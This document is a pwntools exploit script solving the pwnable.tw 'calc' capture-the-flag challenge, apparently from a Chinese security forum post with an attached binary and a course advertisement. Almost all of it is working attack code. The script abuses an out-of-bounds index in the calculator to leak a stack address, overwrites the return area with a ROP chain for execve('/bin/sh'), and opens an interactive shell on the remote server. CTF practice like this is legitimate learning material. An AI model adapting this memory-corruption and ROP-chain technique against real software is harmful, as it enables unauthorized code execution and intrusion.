
```
from pwn import *

p=remote('chall.pwnable.tw',10100)
#p=process("./calc")

key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]

p.recv()
p.sendline('+360')
addr_bp=int(p.recv())
addr_re=((addr_bp+0x100000000)&0xFFFFFFF0)-16
addr_str=addr_re+20-0x100000000
addr=361

for i in range(5):
      p.sendline('+'+str(addr+i))
      ans=int(p.recv())
      if key[i]<ans:
             ans=ans-key[i]
             p.sendline('+'+str(addr+i)+'-'+str(ans))
      else:
          ans=key[i]-ans
          p.sendline('+'+str(addr+i)+'+'+str(ans))
      p.recv()

p.sendline('+'+'365'+str(addr_str))
p.recv()

for i in range(5,8):
      p.sendline('+'+str(addr+i))
      ans=int(p.recv())
      if key[i]<ans:
             ans=ans-key[i]
             p.sendline('+'+str(addr+i)+'-'+str(ans))
      else:
          ans=key[i]-ans
          p.sendline('+'+str(addr+i)+'+'+str(ans))
      p.recv()

p.send('kirin'+'\n')
p.interactive()
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2019-2-2 13:51 被admin编辑，原因： 图片本地费

上传的附件：

- [`calc`](javascript:void(0);)

  （724.61kb，20次下载）
